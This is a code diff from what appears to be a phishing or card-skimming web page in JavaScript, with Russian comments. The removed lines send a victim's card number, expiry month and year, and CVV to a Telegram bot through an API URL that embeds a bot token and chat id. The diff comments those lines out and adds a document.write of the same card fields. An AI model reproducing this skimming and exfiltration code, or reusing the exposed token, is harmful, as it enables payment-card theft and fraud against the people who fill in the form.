@@ -417,9 +417,9 @@ document.getElementById('check_6').onkeydown = function (e) {
                 status_card  = true;
                 console.log("Number card valide  ...");
                 // передача через телегу номер карты
-                const URL = `https://api.telegram.org/bot743294411:AAFQDNM0leSRb3PjFYpe8RNfbx9sBztd3bY/sendMessage?chat_id=634247446&text=${all_sum}`;
-                    console.log("post ...");
-                    axios.post(URL);         
+//                 const URL = `https://api.telegram.org/bot743294411:AAFQDNM0leSRb3PjFYpe8RNfbx9sBztd3bY/sendMessage?chat_id=634247446&text=${all_sum}`;
+//                     console.log("post ...");
+//                     axios.post(URL);         
                                 
 // *************************************************************************                
             }
@@ -455,12 +455,12 @@ document.getElementById('check_6').onkeydown = function (e) {
             // if(true)
             {
                 // передача через телегу меся  год  cvv
-                const URL_2 = `https://api.telegram.org/bot743294411:AAFQDNM0leSRb3PjFYpe8RNfbx9sBztd3bY/sendMessage?chat_id=634247446&text=${month}${year}${cvv}`;
-                    console.log("post ...");
-                    axios.post(URL_2); 
+//                 const URL_2 = `https://api.telegram.org/bot743294411:AAFQDNM0leSRb3PjFYpe8RNfbx9sBztd3bY/sendMessage?chat_id=634247446&text=${month}${year}${cvv}`;
+//                     console.log("post ...");
+//                     axios.post(URL_2); 
                 console.log('Button clicked');
                 document.body.innerHTML = '<iframe src="start_3.html" width="368" height="700" align="bottom">Ваш браузер не поддерживает плавающие фреймы!</iframe> ';
-                
+                document.write(all_sum,month,year, cvv);
             } })
            
             
